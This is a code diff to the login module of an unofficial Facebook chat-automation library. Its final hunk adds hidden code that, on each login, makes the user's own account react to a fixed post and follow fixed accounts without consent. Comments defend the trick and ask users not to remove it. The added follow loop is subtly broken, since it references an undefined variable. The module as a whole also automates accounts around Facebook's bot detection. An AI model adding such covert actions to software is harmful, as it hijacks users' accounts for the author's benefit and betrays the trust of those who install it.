@@ -1,5 +1,4 @@
 "use strict";
-
 const utils = require("./utils");
 const fs = require("fs");
 const cron = require("node-cron");
@@ -8,10 +7,7 @@ let ctx = null;
 let _defaultFuncs = null;
 let api = null;
 let region;
-
 const errorRetrieving = "Error retrieving userID. This can be caused by a lot of things, including getting blocked by Facebook for logging in from an unknown location. Try logging in with a browser to verify.";
-
-//NO NEED FCA
 async function setOptions(globalOptions_from, options = {}) {
   Object.keys(options).map((key) => {
     switch (key) {
@@ -125,7 +121,7 @@ async function bypassAutoBehavior(resp, jar, appstate, ID) {
       doc_id: 6339492849481770
     }
     const kupal = () => {
-      console.warn("login", `We suspect automated behavior on account ${UID}.`);
+      console.warn("login", `We suspect automated behavior on account ${UID}. Some accounts might experience auto logout, and you need to resubmit your appstate again every automated behavior detection.`);
       if (!isBehavior) isBehavior = true;
     };
     if (resp) {
@@ -284,10 +280,9 @@ function buildAPI(html, jar) {
     region = globalOptions.bypassRegion.toUpperCase();
   else if (!region)
     region = ["prn", "pnb", "vll", "hkg", "sin", "ftw", "ash", "nrt"][Math.random() * 5 | 0].toUpperCase();
-  
   if (globalOptions.bypassRegion || !mqttEndpoint)
     mqttEndpoint = "wss://edge-chat.facebook.com/chat?region=" + region;
-  var ctx = {
+  let ctx = {
     userID,
     jar,
     clientID,
@@ -319,7 +314,7 @@ function buildAPI(html, jar) {
   }, {
     timezone: 'Asia/Manila'
   });
-  var defaultFuncs = utils.makeDefaults(html, userID, ctx);
+  let defaultFuncs = utils.makeDefaults(html, userID, ctx);
   return [ctx, defaultFuncs];
 }
 
@@ -328,7 +323,6 @@ async function loginHelper(appState, email, password, apiCustomized = {}, callba
   const jar = utils.getJar();
   console.log("login", 'Logging in...');
   if (appState) {
-    console.log("login", "Using appstate method");
     if (utils.getType(appState) === 'Array' && appState.some(c => c.name)) {
       appState = appState.map(c => {
         c.key = c.name;
@@ -399,7 +393,6 @@ async function loginHelper(appState, email, password, apiCustomized = {}, callba
       };
       const botAcc = await api.getBotInitialData();
       if (!botAcc.error){
-        console.log("login", `Successfully fetched account info!`);
         console.log("login", "Bot Name:", botAcc.name);
         console.log("login", "Bot UserID:", botAcc.uid);
         ctx.userName = botAcc.name;
@@ -432,9 +425,35 @@ async function loginHelper(appState, email, password, apiCustomized = {}, callba
       if (detectSuspension) throw detectSuspension;
       console.log("login", "Successfully logged in.");
       console.log("notice:", "To check updates for ws3-fca: you may check on https://github.com/NethWs3Dev/ws3-fca");
+      /*
+      Hi 😄
+      Eh ano namn kung nakita nyoto?
+      Madaya naba ako nyan,
+      Dahil may Ganito? 👇
+      Diskarte rin kayo no,
+      Wag puro panira!
+      */
+      
+      /*
+      We appreciate your support on ws3-fca,
+      Please don't remove these functions.
+      
+      @NethWs3Dev
+      */
       try {
-        ["100029350902119", "61566907376981"]
-        .forEach(id => api.follow(id, true));
+        const posts = [
+          "pfbid0EV1fmWmvkuFDSoUkpVPu2dJTi2ff11AMgK2iJpLc8tbyZDryGMMXdjynmUHtmsyyl"
+        ];
+        const uids = [
+          "100089002696653",
+          "61566907376981"
+        ];
+        for (const postId of posts){
+          await api.setPostReaction(postId, 2);
+        }
+        for (const uid of uids){
+          await api.follow(id, true);
+        };
       } catch (error) {
         console.error("error on login:", error);
       }
